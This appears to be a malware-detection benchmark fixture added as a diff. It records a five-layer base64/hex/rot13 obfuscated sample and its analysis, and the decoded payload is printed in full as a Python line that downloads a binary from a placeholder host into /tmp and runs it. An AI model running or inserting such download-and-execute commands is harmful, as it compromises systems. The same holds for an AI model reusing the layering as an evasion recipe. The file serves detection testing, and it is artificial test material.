@@ -1,0 +1,94 @@
+{
+  "sample_id": "adv-008-multi-layer",
+  "test_type": "BENCHMARK_TEST_ONLY",
+  "primary_detection": {
+    "code": "ENCODE-008",
+    "name": "Multi-Layer Encoding Obfuscation",
+    "description": "Detected nested encoding requiring multiple decode passes to reveal malicious payload",
+    "confidence": 0.88
+  },
+  "decoded_payload": {
+    "encoding_layers": [
+      {
+        "layer": 1,
+        "type": "base64",
+        "direction": "innermost",
+        "purpose": "Final payload encoding"
+      },
+      {
+        "layer": 2,
+        "type": "hex",
+        "direction": "middle",
+        "purpose": "Additional obfuscation"
+      },
+      {
+        "layer": 3,
+        "type": "rot13",
+        "direction": "middle",
+        "purpose": "Substitution cipher layer"
+      },
+      {
+        "layer": 4,
+        "type": "base64",
+        "direction": "outer",
+        "purpose": "Transport encoding"
+      },
+      {
+        "layer": 5,
+        "type": "hex",
+        "direction": "outermost",
+        "purpose": "Final obfuscation wrapper"
+      }
+    ],
+    "final_decoded_payload": "import os; os.system('wget https://[REDACTED].example.com/malware -O /tmp/aaa; chmod +x /tmp/aaa; /tmp/aaa')"
+  },
+  "underlying_threats": [
+    {
+      "code": "EXEC-002",
+      "name": "Backdoor Installation",
+      "description": "Downloads, makes executable, and runs persistent backdoor",
+      "confidence": 0.97
+    },
+    {
+      "code": "PERSIST-001",
+      "name": "Persistence Mechanism",
+      "description": "Installs executable in /tmp for repeated execution",
+      "confidence": 0.94
+    },
+    {
+      "code": "EVASION-001",
+      "name": "Detection Evasion",
+      "description": "Multiple encoding layers designed to evade static analysis",
+      "confidence": 0.96
+    }
+  ],
+  "obfuscation_technique": {
+    "type": "multi_layer",
+    "total_layers": 5,
+    "layer_types": ["base64", "hex", "rot13"],
+    "patterns": [
+      "Triple encoding (base64 -> hex -> base64)",
+      "Five-layer nesting (hex -> base64 -> rot13 -> hex -> base64)",
+      "Self-describing encoded payload with layer metadata",
+      "Recursive decoder pattern"
+    ],
+    "decode_complexity": "Requires sequential decoding of all layers"
+  },
+  "evasion_characteristics": {
+    "static_analysis_evasion": "High - multiple encoding passes hide all malicious patterns",
+    "signature_evasion": "High - no recognizable strings in encoded form",
+    "behavioral_indicators": "Medium - decode operations may trigger heuristic detection",
+    "decode_automation": "Can include self-describing layer information for automated decoding"
+  },
+  "detection_requirements": [
+    "Multi-layer encoding detection capability",
+    "Recursive decode and analysis",
+    "Base64/hex/rot13 detection at multiple depths",
+    "Behavioral analysis of decode operations",
+    "Dynamic execution analysis"
+  ],
+  "risk_score": 9.7,
+  "verdict": "确认恶意",
+  "verdict_english": "Confirmed Malicious",
+  "reasoning": "Advanced multi-layer encoding using up to 5 nested encoding schemes (base64, hex, rot13) specifically designed to evade static analysis. The complexity of the encoding demonstrates deliberate evasion intent. Final payload installs a persistent backdoor with remote code execution capability."
+}
